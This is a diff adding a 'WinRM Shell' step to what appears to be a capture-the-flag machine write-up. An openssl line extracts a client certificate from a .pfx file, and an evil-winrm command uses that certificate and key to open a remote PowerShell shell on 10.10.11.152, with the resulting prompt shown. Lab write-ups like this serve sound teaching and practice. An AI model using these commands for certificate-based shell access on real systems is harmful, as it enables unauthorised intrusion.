@@ -190,3 +190,10 @@ Key Attributes
 ```CSS
 ▶ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -clcerts -out legacyy_dev_auth.crt
 ```
+# WinRM Shell
+Use the extracted certificate and the key to get a shell on the machine.
+```CSS
+▶ evil-winrm -S -i 10.10.11.152 -c legacyy_dev_auth.crt -k legacyy_dev_auth.key
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+```
